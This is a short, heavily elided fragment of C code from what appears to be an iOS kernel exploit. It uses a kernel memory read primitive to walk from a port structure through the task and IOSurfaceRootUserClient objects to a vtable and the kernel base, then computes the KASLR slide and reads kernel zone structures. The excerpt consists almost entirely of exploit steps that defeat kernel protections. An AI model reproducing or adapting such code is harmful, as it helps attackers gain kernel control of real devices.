...
{ \
    ...
    kptr_t itk_space = 0;
    kread2(realport_addr + ((uintptr_t)&kport.ip_receiver - (uintptr_t)&kport), &itk_space, sizeof(itk_space));
    ...
    kptr_t self_task = 0;
    kread2(itk_space + OFFSET_IPC_SPACE_IS_TASK, &self_task, sizeof(self_task));
    ...
    kread2(self_task + OFFSET_TASK_ITK_REGISTERED, &IOSurfaceRootUserClient_port, sizeof(IOSurfaceRootUserClient_port));
    ...
    kread2(IOSurfaceRootUserClient_port + ((uintptr_t)&kport.ip_kobject - (uintptr_t)&kport), &IOSurfaceRootUserClient_addr, sizeof(IOSurfaceRootUserClient_addr));
    ...
    kread2(IOSurfaceRootUserClient_addr, &IOSurfaceRootUserClient_vtab, sizeof(IOSurfaceRootUserClient_vtab));
    ...
    kread2(IOSurfaceRootUserClient_vtab, vtab, sizeof(vtab));
    ...
    {
        kread2(kbase, &magic, sizeof(magic));
    ...
    mach_hdr_t khdr = { 0 };
    kread2(kbase, &khdr, sizeof(khdr));

#define OFF(name) (OFFSET_ ## name + slide)

    kptr_t zone_map_addr = 0;
    kread2(OFF(ZONE_MAP), &zone_map_addr, sizeof(zone_map_addr));
